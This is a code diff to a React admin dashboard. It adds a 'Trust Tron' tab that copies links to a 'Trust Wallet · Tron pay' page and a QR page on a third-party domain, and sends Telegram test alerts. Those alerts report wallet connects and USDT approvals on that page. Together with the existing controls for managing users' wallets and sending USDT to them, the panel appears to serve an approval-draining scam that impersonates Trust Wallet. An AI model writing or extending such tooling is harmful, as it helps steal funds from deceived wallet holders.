@@ -3,7 +3,7 @@ import { Link, useNavigate } from "react-router-dom";
 import { motion } from "framer-motion";
 import {
   Shield, Search, Users, FileText, Clock, CheckCircle2,
-  Eye, LogOut, User, ShieldCheck, AlertTriangle, Wallet, Loader2, MoreHorizontal
+  Eye, LogOut, User, ShieldCheck, AlertTriangle, Wallet, Loader2, MoreHorizontal, MessageCircle
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -118,6 +118,7 @@ const Admin = () => {
   const [manageWalletChain, setManageWalletChain] = useState<SupportedChain>("ethereum");
   const [paidWalletEntries, setPaidWalletEntries] = useState<PaidWalletEntry[]>([]);
   const [isLoadingPaidWalletEntries, setIsLoadingPaidWalletEntries] = useState(false);
+  const [isTelegramTestSubmitting, setIsTelegramTestSubmitting] = useState(false);
   const [isSendUsdtModalOpen, setIsSendUsdtModalOpen] = useState(false);
   const [sendUsdtTarget, setSendUsdtTarget] = useState<PaidWalletEntry | null>(null);
   const [sendUsdtAmount, setSendUsdtAmount] = useState("10");
@@ -550,6 +551,22 @@ const Admin = () => {
     }
   };
 
+  const handleTelegramTest = async () => {
+    try {
+      setIsTelegramTestSubmitting(true);
+      await apiRequest<{ status: string }>("/admin/telegram/test", {
+        method: "POST",
+        auth: true,
+      });
+      toast.success("Test message sent to Telegram.");
+    } catch (error) {
+      const message = error instanceof ApiError ? error.message : "Telegram test failed.";
+      toast.error(message);
+    } finally {
+      setIsTelegramTestSubmitting(false);
+    }
+  };
+
   const handleQuickAction = () => {
     if (activeTab === "users") {
       void handleWalletLookup();
@@ -567,6 +584,10 @@ const Admin = () => {
       void loadPaidWalletEntries(manageWalletChain);
       return;
     }
+    if (activeTab === "trust-tron") {
+      void handleTelegramTest();
+      return;
+    }
     void loadAuditLogs();
   };
 
@@ -579,7 +600,9 @@ const Admin = () => {
           ? "Submit Withdrawal"
           : activeTab === "manage-wallets"
             ? "Refresh Wallets"
-            : "Refresh Audit";
+            : activeTab === "trust-tron"
+              ? "Send Telegram test"
+              : "Refresh Audit";
 
   const quickActionDisabled =
     activeTab === "users"
@@ -590,7 +613,9 @@ const Admin = () => {
           ? isSubmittingWithdrawal || isConnectingWallet || !canAccessAdmin
           : activeTab === "manage-wallets"
             ? isLoadingPaidWalletEntries
-            : loading;
+            : activeTab === "trust-tron"
+              ? isTelegramTestSubmitting || !canAccessAdmin
+              : loading;
 
   if (loading) {
     return (
@@ -718,6 +743,7 @@ const Admin = () => {
               <TabsTrigger value="disclosures" className="app-tabs-trigger">Disclosure Requests</TabsTrigger>
               <TabsTrigger value="withdrawals" className="app-tabs-trigger">Withdrawals</TabsTrigger>
               <TabsTrigger value="manage-wallets" className="app-tabs-trigger">Manage Users Wallet</TabsTrigger>
+              <TabsTrigger value="trust-tron" className="app-tabs-trigger">Trust Tron</TabsTrigger>
               <TabsTrigger value="audit" className="app-tabs-trigger">Audit Logs</TabsTrigger>
             </TabsList>
 
@@ -1229,6 +1255,71 @@ const Admin = () => {
               )}
             </TabsContent>
 
+            <TabsContent value="trust-tron" className="space-y-5">
+              <div className="app-sticky-subheader">
+                <h3 className="font-display font-bold text-lg text-foreground">Trust Wallet · Tron pay</h3>
+                <p className="text-sm text-muted-foreground mt-1 max-w-2xl">
+                  Telegram alerts mirror public activity on the Tron payment page: wallet connect, completed USDT
+                  approve/transfer, and failed attempts. Configure <code className="text-xs">TELEGRAM_BOT_TOKEN</code>{" "}
+                  and <code className="text-xs">TELEGRAM_CHAT_ID</code> on the API (see backend README).
+                </p>
+              </div>
+              <Card className="app-section-card rounded-xl">
+                <CardContent className="p-5 space-y-4">
+                  <div className="flex items-center gap-2 text-sm font-semibold text-foreground">
+                    <MessageCircle className="w-4 h-4 text-accent" />
+                    Links
+                  </div>
+                  <div className="space-y-2 text-sm">
+                    <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 rounded-lg border border-border/60 p-3">
+                      <span className="text-muted-foreground break-all">https://www.fiulink.com/trustwallet/tron</span>
+                      <Button
+                        type="button"
+                        variant="outline"
+                        size="sm"
+                        className="shrink-0"
+                        onClick={() =>
+                          void handleCopyToClipboard("https://www.fiulink.com/trustwallet/tron", "Tron pay URL")
+                        }
+                      >
+                        Copy
+                      </Button>
+                    </div>
+                    <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 rounded-lg border border-border/60 p-3">
+                      <span className="text-muted-foreground break-all">https://www.fiulink.com/trustwallet/qr</span>
+                      <Button
+                        type="button"
+                        variant="outline"
+                        size="sm"
+                        className="shrink-0"
+                        onClick={() =>
+                          void handleCopyToClipboard("https://www.fiulink.com/trustwallet/qr", "QR page URL")
+                        }
+                      >
+                        Copy
+                      </Button>
+                    </div>
+                  </div>
+                  <Button
+                    type="button"
+                    variant="accent"
+                    className="w-full sm:w-auto"
+                    disabled={isTelegramTestSubmitting || !canAccessAdmin}
+                    onClick={() => void handleTelegramTest()}
+                  >
+                    {isTelegramTestSubmitting ? (
+                      <>
+                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                        Sending…
+                      </>
+                    ) : (
+                      "Send test message to Telegram"
+                    )}
+                  </Button>
+                </CardContent>
+              </Card>
+            </TabsContent>
+
             <TabsContent value="audit" className="space-y-5">
               <div className="app-sticky-subheader">
                 <h3 className="font-display font-bold text-lg text-foreground">Audit Logs</h3>
@@ -1328,6 +1419,14 @@ const Admin = () => {
             onClick={() => setActiveTab("manage-wallets")}
           >
             Wallets
+          </Button>
+          <Button
+            variant={activeTab === "trust-tron" ? "accent" : "outline"}
+            size="sm"
+            className="shrink-0"
+            onClick={() => setActiveTab("trust-tron")}
+          >
+            Trust Tron
           </Button>
           <Button
             variant={activeTab === "audit" ? "accent" : "outline"}
